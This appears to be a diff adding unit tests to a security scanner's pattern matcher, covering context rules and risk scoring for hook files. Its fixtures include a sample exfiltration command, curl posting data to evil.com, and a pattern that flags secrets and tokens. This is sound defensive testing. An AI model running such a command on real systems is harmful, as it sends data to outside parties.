@@ -124,4 +124,51 @@ describe('PatternMatcher', () => {
       expect(findings.length).toBe(0);
     });
   });
+
+  describe('advanced rule features (coverage for exclude/require context and risk scoring)', () => {
+    it('should respect excludeContext and requireContext on rules', () => {
+      const ruleWithContext: Rule = {
+        ...mockRule,
+        id: 'CTX-001',
+        patterns: [/curl/gi],
+        requireContext: [/evil\.com/gi],
+        excludeContext: [/safe/gi],
+      };
+
+      const badContent = 'curl -d "data" https://evil.com';
+      const goodButExcluded = 'curl -d "data" https://safe.example.com';
+      const noContext = 'curl -d "data"';
+
+      const findingsBad = matchRule(ruleWithContext, mockFile, badContent, { contextLines: 2 });
+      const findingsExcluded = matchRule(ruleWithContext, mockFile, goodButExcluded, { contextLines: 2 });
+      const findingsNoCtx = matchRule(ruleWithContext, mockFile, noContext, { contextLines: 2 });
+
+      expect(findingsBad.length).toBeGreaterThan(0); // requireContext matched + no exclude
+      expect(findingsExcluded.length).toBe(0); // excluded by context
+      expect(findingsNoCtx.length).toBe(0); // missing required context
+    });
+
+    it('should boost riskScore for high-risk components and multiple matches', () => {
+      const multiMatchRule: Rule = {
+        ...mockRule,
+        id: 'RISK-001',
+        patterns: [/secret|token|key/gi],
+      };
+
+      const hookFile: DiscoveredFile = {
+        ...mockFile,
+        component: 'hook',
+        relativePath: 'hooks/post-response.sh',
+      };
+
+      const content = 'const t1 = "token123"; const t2 = "secret456";';
+
+      const findings = matchRule(multiMatchRule, hookFile, content, { contextLines: 0 });
+
+      expect(findings.length).toBeGreaterThan(0);
+      // Risk score should be elevated due to multiple matches + hook component
+      const risk = findings[0]?.riskScore ?? 0;
+      expect(risk).toBeGreaterThan(50); // base + multi-match log boost + 1.2x hook multiplier
+    });
+  });
 });
